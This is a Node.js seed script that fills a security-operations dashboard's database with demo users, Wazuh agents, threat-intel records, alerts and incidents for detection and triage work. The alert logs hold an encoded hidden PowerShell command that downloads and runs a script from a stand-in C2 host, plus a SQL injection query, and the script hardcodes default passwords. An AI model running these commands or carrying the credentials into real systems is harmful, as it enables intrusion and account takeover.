const mongoose = require('mongoose');
const config = require('../config');
const { User, Alert, Incident, AgentSnapshot, ThreatIntelResult, AIAnalysis, Notification } = require('../models');
const logger = require('./logger');

const seedData = async () => {
  try {
    await mongoose.connect(config.mongodbUri);
    logger.info('Connected to MongoDB for seeding initial database data...');

    // Clear existing collections if desired
    await Promise.all([
      User.deleteMany({}),
      Alert.deleteMany({}),
      Incident.deleteMany({}),
      AgentSnapshot.deleteMany({}),
      ThreatIntelResult.deleteMany({}),
      AIAnalysis.deleteMany({}),
      Notification.deleteMany({}),
    ]);

    logger.info('Purged previous collections.');

    // 1. Create Users
    const adminUser = await User.create({
      email: 'admin@soc.local',
      password: 'Admin@Password123!',
      firstName: 'Chief',
      lastName: 'SecOps',
      role: 'ADMIN',
      isActive: true,
    });

    const analystUser = await User.create({
      email: 'analyst@soc.local',
      password: 'Analyst@Password123!',
      firstName: 'Sarah',
      lastName: 'Connor',
      role: 'SOC_ANALYST',
      isActive: true,
    });

    const viewerUser = await User.create({
      email: 'viewer@soc.local',
      password: 'Viewer@Password123!',
      firstName: 'Audit',
      lastName: 'Observer',
      role: 'VIEWER',
      isActive: true,
    });

    logger.info('Created default accounts (admin@soc.local, analyst@soc.local, viewer@soc.local)');

    // 2. Create Agent Snapshots
    const agents = await AgentSnapshot.insertMany([
      {
        agentId: '001',
        name: 'prod-web-server-01',
        ip: '10.0.1.15',
        status: 'active',
        os: { name: 'Ubuntu Linux', version: '22.04 LTS', platform: 'ubuntu', arch: 'x86_64' },
        version: 'Wazuh v4.7.2',
        manager: 'wazuh-manager-master',
        group: ['production', 'webservers'],
        lastKeepAlive: new Date(),
        dateAdd: new Date(Date.now() - 30 * 24 * 60 * 60 * 1000),
      },
      {
        agentId: '002',
        name: 'dmz-nginx-lb',
        ip: '10.0.1.4',
        status: 'active',
        os: { name: 'Debian GNU/Linux', version: '12 Bookworm', platform: 'debian', arch: 'x86_64' },
        version: 'Wazuh v4.7.2',
        group: ['dmz', 'loadbalancers'],
        lastKeepAlive: new Date(),
        dateAdd: new Date(Date.now() - 45 * 24 * 60 * 60 * 1000),
      },
      {
        agentId: '003',
        name: 'database-cluster-master',
        ip: '10.0.2.10',
        status: 'active',
        os: { name: 'Red Hat Enterprise Linux', version: '9.2', platform: 'rhel', arch: 'x86_64' },
        version: 'Wazuh v4.7.2',
        group: ['databases', 'high-security'],
        lastKeepAlive: new Date(),
        dateAdd: new Date(Date.now() - 60 * 24 * 60 * 60 * 1000),
      },
      {
        agentId: '004',
        name: 'win-finance-workstation',
        ip: '10.0.3.55',
        status: 'disconnected',
        os: { name: 'Microsoft Windows 11 Enterprise', version: '10.0.22631', platform: 'windows', arch: 'x86_64' },
        version: 'Wazuh v4.7.1',
        group: ['workstations', 'finance'],
        lastKeepAlive: new Date(Date.now() - 2 * 60 * 60 * 1000),
        dateAdd: new Date(Date.now() - 20 * 24 * 60 * 60 * 1000),
      },
    ]);

    // 3. Create Threat Intel Results
    const threatIntel1 = await ThreatIntelResult.create({
      indicator: '185.220.101.45',
      indicatorType: 'ip',
      source: 'abuseipdb',
      reputation: 'malicious',
      abuseScore: 98,
      country: 'Germany',
      isp: 'Tor Exit Node Relay Services',
      maliciousReports: 1420,
      ttl: new Date(Date.now() + 24 * 60 * 60 * 1000),
    });

    const threatIntel2 = await ThreatIntelResult.create({
      indicator: '194.26.29.112',
      indicatorType: 'ip',
      source: 'abuseipdb',
      reputation: 'suspicious',
      abuseScore: 48,
      country: 'Russia',
      isp: 'DataCenter Provider LLC',
      maliciousReports: 87,
      ttl: new Date(Date.now() + 24 * 60 * 60 * 1000),
    });

    // 4. Create Sample Normalized Alerts
    const alertsData = [
      {
        wazuhAlertId: 'wazuh-alert-1001',
        timestamp: new Date(Date.now() - 10 * 60 * 1000),
        ruleId: '5710',
        ruleLevel: 10,
        ruleDescription: 'sshd: Multiple failed login attempts (potential SSH brute force)',
        ruleGroups: ['sshd', 'authentication_failed', 'syslog'],
        agentId: '001',
        agentName: 'prod-web-server-01',
        agentIp: '10.0.1.15',
        sourceIp: '185.220.101.45',
        destinationIp: '10.0.1.15',
        sourcePort: 48320,
        destinationPort: 22,
        location: '/var/log/auth.log',
        decoder: 'sshd',
        fullLog: 'pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh rhost=185.220.101.45 user=root',
        mitre: {
          id: ['T1110.001'],
          tactic: ['Credential Access'],
          technique: ['Password Guessing'],
        },
        severity: 'high',
        status: 'INVESTIGATING',
        riskScore: 78,
      },
      {
        wazuhAlertId: 'wazuh-alert-1002',
        timestamp: new Date(Date.now() - 8 * 60 * 1000),
        ruleId: '80710',
        ruleLevel: 12,
        ruleDescription: 'Possible SQL Injection attempt detected in HTTP URI query string',
        ruleGroups: ['web', 'accesslog', 'attack'],
        agentId: '002',
        agentName: 'dmz-nginx-lb',
        agentIp: '10.0.1.4',
        sourceIp: '194.26.29.112',
        destinationIp: '10.0.1.4',
        sourcePort: 54102,
        destinationPort: 443,
        location: '/var/log/nginx/access.log',
        decoder: 'web-accesslog',
        fullLog: '194.26.29.112 - - [07/Oct/2026:22:15:30 +0000] "GET /api/v1/users?id=1%27%20OR%201=1-- HTTP/1.1" 200 4120',
        mitre: {
          id: ['T1190'],
          tactic: ['Initial Access'],
          technique: ['Exploit Public-Facing Application'],
        },
        severity: 'critical',
        status: 'NEW',
        riskScore: 89,
      },
      {
        wazuhAlertId: 'wazuh-alert-1003',
        timestamp: new Date(Date.now() - 25 * 60 * 1000),
        ruleId: '554',
        ruleLevel: 8,
        ruleDescription: 'File Integrity Monitoring: Critical system binary modified (/bin/login)',
        ruleGroups: ['syscheck', 'fim'],
        agentId: '003',
        agentName: 'database-cluster-master',
        agentIp: '10.0.2.10',
        sourceIp: '',
        destinationIp: '',
        location: 'syscheck',
        decoder: 'syscheck',
        fullLog: 'File \'/bin/login\' checksum modified. Old md5: 8b1a9953c4611296a827abf8c47804d7, New md5: d41d8cd98f00b204e9800998ecf8427e',
        mitre: {
          id: ['T1565.001'],
          tactic: ['Impact'],
          technique: ['Stored Data Manipulation'],
        },
        severity: 'high',
        status: 'NEW',
        riskScore: 72,
      },
      {
        wazuhAlertId: 'wazuh-alert-1004',
        timestamp: new Date(Date.now() - 40 * 60 * 1000),
        ruleId: '60100',
        ruleLevel: 14,
        ruleDescription: 'Suspicious PowerShell execution: Base64 encoded payload with WebClient download',
        ruleGroups: ['windows', 'powershell', 'malware'],
        agentId: '004',
        agentName: 'win-finance-workstation',
        agentIp: '10.0.3.55',
        sourceIp: '91.240.118.172',
        destinationIp: '10.0.3.55',
        location: 'WinEvtLog',
        decoder: 'windows',
        fullLog: 'powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AYwAyAC4AbQBhAGwAaQBjAGkAbwB1AHMALgBpAG8ALwBwAGEAeQBsAG8AYQBkAC4AcABzADEAJwApAA==',
        mitre: {
          id: ['T1059.001', 'T1105'],
          tactic: ['Execution', 'Command and Control'],
          technique: ['PowerShell', 'Ingress Tool Transfer'],
        },
        severity: 'critical',
        status: 'INVESTIGATING',
        riskScore: 95,
      },
      {
        wazuhAlertId: 'wazuh-alert-1005',
        timestamp: new Date(Date.now() - 90 * 60 * 1000),
        ruleId: '31101',
        ruleLevel: 6,
        ruleDescription: 'Nmap port scan detected from internal host',
        ruleGroups: ['firewall', 'scan'],
        agentId: '001',
        agentName: 'prod-web-server-01',
        agentIp: '10.0.1.15',
        sourceIp: '10.0.3.110',
        destinationIp: '10.0.1.15',
        location: '/var/log/syslog',
        decoder: 'iptables',
        fullLog: 'iptables: IN=eth0 OUT= SRC=10.0.3.110 DST=10.0.1.15 PROTO=TCP SPT=49152 DPT=3306 SYN',
        mitre: {
          id: ['T1046'],
          tactic: ['Discovery'],
          technique: ['Network Service Discovery'],
        },
        severity: 'medium',
        status: 'ACKNOWLEDGED',
        riskScore: 45,
      },
    ];

    const createdAlerts = await Alert.insertMany(alertsData);
    logger.info(`Inserted ${createdAlerts.length} initial security alerts.`);

    // 5. Create AI Analyses for each alert
    for (const alert of createdAlerts) {
      const ai = await AIAnalysis.create({
        alertId: alert._id,
        riskScore: alert.riskScore,
        severity: alert.severity,
        threatType: alert.ruleGroups.includes('powershell') ? 'PowerShell Ingress / C2 Execution' : 'Brute Force / Web Attack',
        confidence: 0.92,
        isAnomaly: alert.riskScore >= 60,
        mitreTechniques: (alert.mitre.technique || []).map((t) => ({ name: t })),
        explanation: `Automated AI triage flagged rule "${alert.ruleDescription}" as ${alert.severity.toUpperCase()} risk. Host "${alert.agentName}" exhibited suspicious signatures aligned with MITRE ATT&CK framework tactics.`,
        recommendedActions: [
          `Review source IP logs and firewall ingress tables.`,
          `Validate whether administrative credentials were compromised during authentication events.`,
          `Isolate host if unapproved payload execution is verified.`,
        ],
        riskFactors: [
          { factor: 'Wazuh Rule Level', weight: 35, value: `Level ${alert.ruleLevel}`, contribution: Math.round((alert.ruleLevel / 15) * 35) },
          { factor: 'Threat Intel Reputation', weight: 20, value: alert.sourceIp ? 'External Tor/Hosting IP' : 'Internal Host', contribution: alert.sourceIp ? 18 : 5 },
          { factor: 'MITRE Severity Weight', weight: 15, value: alert.mitre.technique[0] || 'Generic', contribution: 12 },
        ],
        analysisSource: 'hybrid',
      });

      alert.aiAnalysis = ai._id;
      await alert.save();
    }

    // 6. Create Initial Incidents
    const inc1 = await Incident.create({
      incidentId: 'INC-00001',
      title: 'PowerShell Ingress & C2 WebClient Download on Win-Finance',
      description: 'Host win-finance-workstation executed base64 encoded PowerShell string attempting to fetch remote C2 payload from external IP 91.240.118.172.',
      severity: 'critical',
      status: 'INVESTIGATING',
      relatedAlerts: [createdAlerts[3]._id],
      affectedAgents: [{ agentId: '004', agentName: 'win-finance-workstation', agentIp: '10.0.3.55' }],
      sourceIps: ['91.240.118.172'],
      assignedTo: analystUser._id,
      createdBy: adminUser._id,
      riskScore: 95,
      timeline: [
        {
          timestamp: new Date(Date.now() - 40 * 60 * 1000),
          action: 'Incident Created',
          description: 'Automated correlation created incident from Critical PowerShell alert',
          automated: true,
        },
        {
          timestamp: new Date(Date.now() - 35 * 60 * 1000),
          action: 'Analyst Assigned',
          description: 'Assigned to Sarah Connor for immediate endpoint triage',
          user: adminUser._id,
          automated: false,
        },
        {
          timestamp: new Date(Date.now() - 20 * 60 * 1000),
          action: 'Host Isolated',
          description: 'Requested endpoint isolation on win-finance-workstation pending memory dump review.',
          user: analystUser._id,
          automated: false,
        },
      ],
      comments: [
        {
          text: 'Memory dump capture initiated. Suspicious process parent was explorer.exe spawning powershell.exe.',
          user: analystUser._id,
          createdAt: new Date(Date.now() - 15 * 60 * 1000),
        },
      ],
    });

    const inc2 = await Incident.create({
      incidentId: 'INC-00002',
      title: 'Distributed SSH Brute Force Campaign against Web Cluster',
      description: 'Multiple automated dictionary password guessing attempts observed targeting root and service accounts on prod-web-server-01 from known Tor exit nodes.',
      severity: 'high',
      status: 'OPEN',
      relatedAlerts: [createdAlerts[0]._id],
      affectedAgents: [{ agentId: '001', agentName: 'prod-web-server-01', agentIp: '10.0.1.15' }],
      sourceIps: ['185.220.101.45'],
      threatIntelResults: [threatIntel1._id],
      riskScore: 78,
      timeline: [
        {
          timestamp: new Date(Date.now() - 10 * 60 * 1000),
          action: 'Incident Created',
          description: 'Automated high risk threshold met by SSH brute force events',
          automated: true,
        },
      ],
    });

    createdAlerts[3].incidentId = inc1._id;
    await createdAlerts[3].save();
    createdAlerts[0].incidentId = inc2._id;
    await createdAlerts[0].save();

    // 7. Initial Notifications
    await Notification.create([
      {
        type: 'alert',
        title: 'CRITICAL Alert: Base64 PowerShell execution',
        message: 'Agent: win-finance-workstation | Rule Level: 14 | Risk Score: 95',
        severity: 'critical',
        referenceType: 'alert',
        referenceId: createdAlerts[3]._id,
        read: false,
      },
      {
        type: 'incident',
        title: '🚨 New Incident: INC-00001 (CRITICAL)',
        message: 'PowerShell Ingress & C2 WebClient Download on Win-Finance',
        severity: 'critical',
        referenceType: 'incident',
        referenceId: inc1._id,
        read: false,
      },
    ]);

    logger.info('Database seeded successfully with users, agents, alerts, incidents, and threat intel!');
    process.exit(0);
  } catch (err) {
    logger.error(`Seeding error: ${err.message}`);
    process.exit(1);
  }
};

seedData();
